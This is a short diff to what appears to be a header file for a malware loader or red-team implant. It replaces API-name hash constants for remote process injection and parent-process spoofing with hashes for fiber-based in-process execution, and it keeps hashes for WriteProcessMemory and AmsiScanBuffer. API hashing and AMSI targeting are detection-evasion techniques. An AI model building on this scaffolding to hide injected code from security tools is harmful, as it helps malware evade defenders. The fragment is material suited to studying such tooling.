@@ -78,15 +78,9 @@
 #define WriteProcessMemory_JOAAT        0x184EC554
 #define AmsiScanBuffer_JOAAT            0x725879AF
 
-// ----------- Inject.c — Remote process injection + PPID spoof -----------
-#define NtCreateThreadEx_JOAAT                  0xE5F15DAA
-#define NtUnmapViewOfSection_JOAAT              0x0A6A385C
-#define CreateToolhelp32Snapshot_JOAAT          0x58345E52
-#define Process32FirstW_JOAAT                   0xF4249A03
-#define Process32NextW_JOAAT                    0xFF8486DE
-#define OpenProcess_JOAAT                       0xA650376B
-#define InitializeProcThreadAttributeList_JOAAT 0x8F01862A
-#define UpdateProcThreadAttribute_JOAAT         0x0C6CB2A1
-#define DeleteProcThreadAttributeList_JOAAT     0x30A136E9
-#define ResumeThread_JOAAT                      0xDF485CF4
+// ----------- Exec.c — In-process fiber / thread-pool execution (kernel32) -----------
+#define ConvertThreadToFiber_JOAAT  0xD6150854
+#define CreateFiber_JOAAT           0xD7A2327B
+#define SwitchToFiber_JOAAT         0x2140D892
+#define DeleteFiber_JOAAT           0x24C4DAFC
 
